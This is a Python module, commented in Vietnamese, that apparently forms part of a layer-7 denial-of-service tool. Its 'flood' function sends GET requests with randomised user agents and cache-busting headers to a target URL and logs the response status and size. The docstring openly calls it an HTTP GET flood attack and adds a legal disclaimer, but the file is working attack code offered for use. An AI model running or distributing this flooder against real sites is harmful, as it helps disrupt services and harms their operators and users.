"""Module cung cấp hàm flood để thực hiện tấn công HTTP GET request DoS attack.

Lưu ý: Việc tấn công DoS có thể vi phạm pháp luật. Chỉ sử dụng cho mục đích nghiên cứu và kiểm thử trong môi trường hợp pháp.
"""

import json
import random
import logging
import requests
from requests.exceptions import Timeout, RequestException
from colorama import Fore as F

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Load user agents từ file JSON
try:
    with open("tools/L7/user_agents.json", "r") as agents_file:
        user_agents = json.load(agents_file).get("agents", [])
except Exception as e:
    logging.error("Lỗi khi load user agents: %s", e)
    user_agents = []

# Headers mặc định
default_headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

# Mã màu hiển thị kết quả
color_code = {True: F.GREEN, False: F.RED}

def flood(target: str) -> None:
    """Khởi động tấn công HTTP GET request flood đến target.

    Args:
        target (str): URL của mục tiêu tấn công.
    """
    # Tạo bản sao của headers và chọn user-agent ngẫu nhiên
    headers = default_headers.copy()
    headers["User-agent"] = random.choice(user_agents) if user_agents else "Mozilla/5.0"

    try:
        response = requests.get(target, headers=headers, timeout=4)
        status_text = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]{F.RESET}"
        payload_size = f"Requested Data Size: {F.CYAN}{round(len(response.content) / 1024, 2):>6} KB{F.RESET}"
        logging.info("%s --> %s", status_text, payload_size)
    except Timeout:
        logging.error(f"{F.RED}[!] Timeout khi gửi request đến {target}{F.RESET}")
    except RequestException as e:
        logging.error(f"{F.RED}[!] Lỗi khi gửi request: {e}{F.RESET}")